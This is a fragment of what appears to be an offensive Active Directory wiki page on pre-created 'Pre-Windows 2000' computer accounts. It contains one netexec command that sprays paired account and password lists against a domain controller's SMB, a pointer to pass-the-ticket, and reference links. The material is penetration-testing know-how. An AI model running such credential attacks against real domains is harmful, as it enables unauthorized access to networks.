---
title: "Pre-Windows 2000 computers"
---
...
netexec smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce
```
...
The ticket obtained can then be used with [ptt.md](/ad/movement/kerberos/pass-the/ptt)

</Callout>

## Reference

<ResourceCard href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/" title="www.trustedsec.com" description="www.trustedsec.com" />

<ResourceCard href="https://web.archive.org/web/20080205233505/http://support.microsoft.com/kb/320187" title="HOW TO: Manage Computer Accounts in Active Directory in Windows 2000" description="web.archive.org" />
